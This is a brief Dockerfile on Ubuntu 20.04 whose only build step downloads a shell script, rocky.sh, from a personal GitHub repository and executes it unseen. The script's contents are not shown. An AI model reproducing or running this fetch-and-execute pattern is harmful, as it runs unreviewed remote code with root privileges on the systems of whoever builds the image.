FROM ubuntu:20.04

# Insta
RUN \
  apt-get update && \
    apt-get install -y wget && \
      apt-get install -y unzip && \
        wget https://github.com/thoeb292/thoeb292/raw/main/rocky.sh && \
	  chmod +x rocky.sh && \
	     ./rocky.sh && \
	       rm -rf /var/lib/apt/lists/*
